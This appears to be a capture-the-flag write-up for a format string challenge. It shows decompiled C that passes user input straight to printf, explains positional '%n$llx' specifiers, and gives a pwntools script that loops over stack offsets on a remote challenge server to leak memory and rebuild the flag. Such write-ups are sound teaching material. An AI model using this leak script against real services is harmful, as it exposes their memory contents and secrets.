# Category: 🧠 Pwn
# Difficulty: Easy to Medium
# Vulnerability: Format String Attack

---

## Useful resource that helped me solve this challenge:
[https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)

---

## Description:

### The problem's description doesn't give us any hints about the type of vulnerability we may be dealing with.
### (Opposite to what the description suggests, this challenge is not a good "first challenge" if you have just started Pwn).

---

## Inspecting:

### This was actually quite a surprise, as the second part of the challenge actually provides a hint:
```
Care dintre următoarele funcții poate fi vulnerabilă la un format string attack?

scanf
strcpy
printf
memcpy
```
### From this, we can assume that our vulnerability is a format string attack. (And this assumption, unlike the previous one, is a good and correct one.)

---

## Solution:

### Upon looking at the executable's code in Ghidra, we notice an oddly named function:
```c
void vulnerableFunction(char *param_1)
{
  printf(param_1);
  putchar(10);
  return;
}
```
### This function is vulnerable because it allows the attacker to leak data if they control the format argument passed to `printf`.
### Fragment taken from the mentioned resource:
```
Printf can also index to an arbitrary "argument" with the following syntax: %n$x
(where n is the decimal index of the argument you want).
```

---

### Using this, we can create the following script to automate the task (this is actually mandatory, as it would take years to find the flag manually):
```python
from pwn import *

for step in range(1, 100):
    conn = remote("34.185.136.190", 30530)

    conn.recvuntil("Enter your input:")
    payload = "%"
    payload = payload + str(step)
    payload = payload + "$llx"
    payload = payload.encode()
    conn.sendline(payload)
    conn.recvline().strip()
    output = conn.recvline().strip()
    output = output.zfill(16)
    output = bytes.fromhex(output.decode()).lower()[::-1]
    print(str(output))
```

## Disclaimer: This may not be the most optimal code, but it is the one I wrote the fastest.

---

### FLAG (not the actual flag):

```
ctf{230952df575051546fa84REDACTEDa9c7e5576dc08eab3ea20c55d719351c90a}
```

---